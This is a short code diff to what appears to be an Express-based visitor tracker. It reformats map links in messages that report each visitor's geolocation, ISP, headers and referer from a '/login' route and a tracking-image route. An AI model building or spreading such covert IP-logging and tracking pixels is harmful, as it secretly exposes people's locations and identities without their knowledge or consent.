@@ -52,7 +52,7 @@ app.post("/login", async (req, res) => {
     const referer = req.headers["referer"] || "Direct Link";
     const connection = req.headers["connection"] || "Unknown";
     const host = req.headers["host"] || "Unknown";
-    const locationLink = `https://www.google.com/maps?q=$${lat},${lon}`;
+    const locationLink = `http://maps.google.com/?q=${lat},${lon}`;
 
     const message = `
 📍 New Visitor Tracked:
@@ -62,7 +62,7 @@ Country: ${country} (${countryCode})
 Region: ${regionName}
 City: ${city}
 ZIP: ${zip}
-🌐 Location: ${locationLink}
+🌐 Location: [Open Map](${locationLink})
 Lat, Lon: ${lat}, ${lon}
 Timezone: ${timezone}
 ISP: ${isp}
@@ -131,7 +131,7 @@ app.get("/track-image", async (req, res) => {
     const referer = req.headers["referer"] || "Direct Link";
     const connection = req.headers["connection"] || "Unknown";
     const host = req.headers["host"] || "Unknown";
-    const locationLink = `https://www.google.com/maps?q=${lat},${lon}`; // Added here
+    const locationLink = `http://maps.google.com/?q=${lat},${lon}`; // Added here
 
     const message = `
 📸 Image Tracker Triggered
@@ -145,7 +145,7 @@ app.get("/track-image", async (req, res) => {
 🔗 Referer: ${referer}
 🔌 Connection: ${connection}
 🧑‍💻 Host: ${host}
-👉 Location Link: ${locationLink}
+📍 Location: [Open Map](${locationLink})
     `;
 
     await axios.get(
